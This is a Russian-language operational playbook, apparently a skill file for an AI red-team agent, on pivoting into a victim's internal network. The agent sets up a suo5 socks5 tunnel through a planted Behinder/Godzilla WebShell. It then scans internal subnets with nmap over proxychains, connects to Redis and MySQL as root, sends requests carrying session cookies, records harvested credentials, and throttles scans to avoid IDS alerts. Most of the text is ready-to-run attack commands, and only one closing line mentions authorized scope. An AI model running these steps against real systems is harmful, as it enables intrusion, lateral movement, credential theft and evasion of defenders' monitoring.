# Туннель suo5 во внутреннюю сеть

> **Стандартный канал входа во внутреннюю сеть только один**: получив WebShell/RCE, **обязательно** сначала поднимите socks5-туннель на suo5,
> зарегистрируйте туннель в базе (`redteam_tunnel_add` kind=suo5) и проверьте через `redteam_session_check`, что он действительно работает,
> и только потом переходите к картированию и перемещению. **Без туннеля не пишите скрипты зондирования внутренней сети вручную** — вручную это медленно и легко убить точку входа.
> WebShell на входе туннеля должен быть веб-шеллом Behinder/Godzilla (см. навык `webshell-toolkit`), иначе пользователь не сможет его переиспользовать.

Бинарник: `$DSH_HOME/redteam/toolkit/suo5/suo5-linux-amd64` (v2.2.0, статический Go, без зависимостей)

## Поднятие туннеля
```bash
SUO5=$DSH_HOME/redteam/toolkit/suo5/suo5-linux-amd64

# 1) использовать WebShell как точку туннеля (тип HTTP)
$SUO5 -t "https://target.example.com/upload/x.jsp" -l 127.0.0.1:1080 -m socks5

# 2) когда нужна аутентификация
$SUO5 -t "https://target.example.com/upload/x.jsp" -l 127.0.0.1:1080 --auth user:pass

# 3) только HTTP-прокси (часть инструментов поддерживает лишь http proxy)
$SUO5 -t "https://target.example.com/upload/x.jsp" -l 127.0.0.1:8081 -m http
```
Кратко о параметрах: `-t` URL шелла на цели, `-l` локальный слушатель, `-m socks5|http`, `--auth user:pass`, `-r` интервал переподключения, `--debug` просмотр трафика.

## Работа во внутренней сети через туннель
```bash
# curl через socks5
curl -s --socks5 127.0.0.1:1080 http://10.0.0.5:8080/ -I

# для nmap обязателен -sT (полное соединение) + proxychains либо напрямую --proxies (в новых версиях)
proxychains4 -q nmap -sT -Pn -p 22,80,445,3389,3306,6379,8080 10.0.0.0/24 -oN runs/internal-nmap.txt

# базы данных / промежуточное ПО
proxychains4 -q redis-cli -h 10.0.0.6 -p 6379 info
proxychains4 -q mysql -h 10.0.0.7 -u root -p --connect-timeout=5

# браузер и тестирование интерфейсов через туннель
curl -s --socks5 127.0.0.1:1080 "http://10.0.0.8:8080/api/user/1" -H "Cookie: JSESSIONID=..."
```

## Темп сканирования внутренней сети (без срабатывания алертов)
- Сначала проверка живости по `/24` (`nmap -sn` через туннель или ICMP), затем частые порты по живым хостам.
- Снизьте скорость до `-T2 --max-rate 50`, чтобы не сработал IDS.
- Все новые активы — в `redteam_asset_add` (подсети C по /24 создаются автоматически), с пометкой `provenance="active"`, `tool="suo5+nmap"`.

## Запись в базу
- **Регистрировать сразу после поднятия (обязательно)**: `redteam_tunnel_add` (`kind=suo5`, `listen=127.0.0.1:1080`, `entry=<WebShell URL>`, `reach=достижимая подсеть`, `command=полная команда запуска`), `webshell_id` указывает на соответствующую запись WebShell; затем `redteam_session_check` для фактической проверки связности и только после status=active двигайтесь дальше.
- Сам туннель — в `redteam_chain_add` (stage=pivot, в detail endpoint туннеля и локальный порт).
- Каждый актив внутренней сети, каждый успешный вход и каждые учётные данные — отдельными записями (asset/access/credential).
- Если туннель упал, пометьте его down через `redteam_tunnel_update`; не оставляйте туннель, который «выглядит работающим, но не проходит», чтобы следующие роли не провалились в пустоту.

## Замечания
- Файлы точки входа туннеля после работы удаляйте по необходимости, возвращая цель в исходное состояние.
- Бесплатные публичные прокси не годятся для туннеля; suo5 работает через WebShell самой цели и не требует дополнительного прокси.
- Использовать только в авторизованной области.
